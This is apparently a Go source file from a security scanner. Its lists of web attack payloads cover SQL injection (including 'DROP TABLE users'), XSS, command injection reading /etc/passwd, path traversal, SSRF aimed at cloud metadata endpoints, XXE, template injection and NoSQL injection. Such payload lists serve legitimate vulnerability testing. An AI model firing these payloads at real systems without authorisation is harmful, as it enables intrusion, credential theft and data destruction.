// Package payloads contains security test payloads
package payloads

// SQLInjection payloads for testing SQL injection vulnerabilities
var SQLInjection = []string{
	// Error-based
	"'",
	"\"",
	"' OR '1'='1",
	"\" OR \"1\"=\"1",
	"' OR '1'='1'--",
	"' OR '1'='1'/*",
	"1' OR '1'='1",
	"1 OR 1=1",
	"1 OR 1=1--",
	"1 OR 1=1#",
	// Time-based
	"' AND SLEEP(5)--",
	"' AND BENCHMARK(5000000,SHA1('test'))--",
	"'; WAITFOR DELAY '0:0:5'--",
	"1; SELECT SLEEP(5)--",
	// UNION-based
	"' UNION SELECT NULL--",
	"' UNION SELECT NULL,NULL--",
	"' UNION SELECT NULL,NULL,NULL--",
	"' UNION SELECT username,password FROM users--",
	// Stacked queries
	"'; DROP TABLE users--",
	"1; INSERT INTO users VALUES('hacker','hacked')--",
}

// XSS payloads for testing Cross-Site Scripting
var XSS = []string{
	// Basic
	"<script>alert('XSS')</script>",
	"<script>alert(1)</script>",
	"<img src=x onerror=alert(1)>",
	"<svg onload=alert(1)>",
	"<body onload=alert(1)>",
	// Event handlers
	"<div onmouseover=alert(1)>",
	"<input onfocus=alert(1) autofocus>",
	"<select onfocus=alert(1) autofocus>",
	"<textarea onfocus=alert(1) autofocus>",
	"<keygen onfocus=alert(1) autofocus>",
	// Encoded
	"<script>alert(String.fromCharCode(88,83,83))</script>",
	"<img src=x onerror=\"&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;\">",
	"<a href=\"javascript:alert(1)\">click</a>",
	// Bypass filters
	"<ScRiPt>alert(1)</sCrIpT>",
	"<script >alert(1)</script >",
	"<script/src=data:,alert(1)>",
	"<svg/onload=alert(1)>",
	"<<script>alert(1)//</script>",
	// Template injection
	"{{constructor.constructor('alert(1)')()}}",
	"${alert(1)}",
	"<%- alert(1) %>",
}

// CommandInjection payloads for testing OS command injection
var CommandInjection = []string{
	// Unix
	"; ls -la",
	"| ls -la",
	"&& ls -la",
	"|| ls -la",
	"`ls -la`",
	"$(ls -la)",
	"; cat /etc/passwd",
	"| cat /etc/passwd",
	"&& cat /etc/passwd",
	"; id",
	"| id",
	"&& id",
	// Windows
	"& dir",
	"| dir",
	"&& dir",
	"|| dir",
	"& type C:\\Windows\\win.ini",
	// Time-based
	"; sleep 5",
	"| sleep 5",
	"&& sleep 5",
	"& timeout 5",
}

// PathTraversal payloads for testing directory traversal
var PathTraversal = []string{
	"../",
	"../../",
	"../../../",
	"../../../../",
	"../../../../../",
	"../../../../../../etc/passwd",
	"../../../../../../windows/win.ini",
	"....//....//....//etc/passwd",
	"..%2f..%2f..%2fetc/passwd",
	"..%252f..%252f..%252fetc/passwd",
	"..\\..\\..\\windows\\win.ini",
	"..%5c..%5c..%5cwindows\\win.ini",
	"/etc/passwd%00",
	"/etc/passwd%00.jpg",
}

// SSRF payloads for testing Server-Side Request Forgery
var SSRF = []string{
	"http://127.0.0.1",
	"http://localhost",
	"http://[::1]",
	"http://0.0.0.0",
	"http://127.0.0.1:22",
	"http://127.0.0.1:80",
	"http://127.0.0.1:443",
	"http://127.0.0.1:3306",
	"http://169.254.169.254",
	"http://169.254.169.254/latest/meta-data/",
	"http://metadata.google.internal",
	"http://metadata.google.internal/computeMetadata/v1/",
	"http://100.100.100.200/latest/meta-data/",
	"file:///etc/passwd",
	"file:///c:/windows/win.ini",
	"gopher://127.0.0.1:70",
	"dict://127.0.0.1:6379/info",
}

// IDOR test patterns for Insecure Direct Object References
var IDOR = []struct {
	Pattern string
	Desc    string
}{
	{"/user/1", "Change user ID to 1"},
	{"/user/0", "Change user ID to 0"},
	{"/user/-1", "Change user ID to -1"},
	{"/user/2", "Change user ID to 2 (adjacent)"},
	{"/account?id=1", "Parameter based IDOR"},
	{"/api/v1/users/1", "API endpoint IDOR"},
	{"/download?file=../../../etc/passwd", "Path traversal via parameter"},
}

// XXE payloads for XML External Entity attacks
var XXE = []string{
	`<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>`,
	`<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><foo>&xxe;</foo>`,
	`<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://127.0.0.1:80">]><foo>&xxe;</foo>`,
	`<?xml version="1.0"?><!DOCTYPE data [<!ENTITY xxe SYSTEM "expect://id">]><data>&xxe;</data>`,
}

// SSTI payloads for testing Server-Side Template Injection
var SSTI = []string{
	"{{7*7}}", "{{config}}", "${7*7}", "<%= 7*7 %>", "#{7*7}",
	"{{7*'7'}}", "${'test'.toUpperCase()}", "{{self.__init__.__globals__}}",
	"{{''.__class__.__mro__[2].__subclasses__()}}",
}

// NoSQLInjection payloads for testing NoSQL injection vulnerabilities
var NoSQLInjection = []string{
	`{"$gt": ""}`, `{"$ne": null}`, `{"$regex": ".*"}`,
	`{"$where": "1==1"}`, `{"$or": []}`,
	`' || '1'=='1`, `' || 1==1`,
	`admin' && this.password.match(/.*/)//`,
}
